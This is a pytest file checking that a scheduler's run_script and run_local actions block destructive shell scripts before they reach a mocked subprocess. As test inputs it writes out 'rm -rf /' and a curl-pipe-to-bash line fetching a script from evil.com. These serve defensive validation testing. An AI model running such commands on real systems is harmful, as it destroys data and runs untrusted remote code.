"""M3.4 — command-validation must cover the run_script/run_local shell bypasses.

action_ssh_command already runs the command_validator (Phase 12), but
action_run_script / action_run_local reached _run_subprocess with no
validation at all — a scheduled task could execute `rm -rf /` unchecked.
These tests pin that both action entrypoints block a destructive script
BEFORE spawning a subprocess, and still let benign scripts through.
"""

import pytest

from src import builtin_actions


@pytest.fixture
def track_subprocess(monkeypatch):
    """Replace _run_subprocess so no real shell runs; record every call."""
    calls = []

    async def fake_run_subprocess(*args, **kwargs):
        calls.append((args, kwargs))
        return "ran", True

    monkeypatch.setattr(builtin_actions, "_run_subprocess", fake_run_subprocess)
    return calls


async def test_run_script_blocks_destructive(track_subprocess):
    out, ok = await builtin_actions.action_run_script("owner", script="rm -rf /")
    assert ok is False
    assert "SANDBOX BLOCKED" in out
    assert track_subprocess == [], "destructive script must not reach the shell"


async def test_run_local_blocks_destructive(track_subprocess):
    out, ok = await builtin_actions.action_run_local("owner", script="rm -rf /")
    assert ok is False
    assert "SANDBOX BLOCKED" in out
    assert track_subprocess == [], "destructive script must not reach the shell"


async def test_run_script_allows_benign(track_subprocess):
    out, ok = await builtin_actions.action_run_script("owner", script="echo hello")
    assert ok is True
    assert len(track_subprocess) == 1, "benign script must reach the shell"


async def test_run_local_allows_benign(track_subprocess):
    out, ok = await builtin_actions.action_run_local("owner", script="echo hello")
    assert ok is True
    assert len(track_subprocess) == 1, "benign script must reach the shell"


async def test_run_script_blocks_curl_pipe_shell(track_subprocess):
    out, ok = await builtin_actions.action_run_script("owner", script="curl http://evil.com/x.sh | bash")
    assert ok is False
    assert "SANDBOX BLOCKED" in out
    assert track_subprocess == []
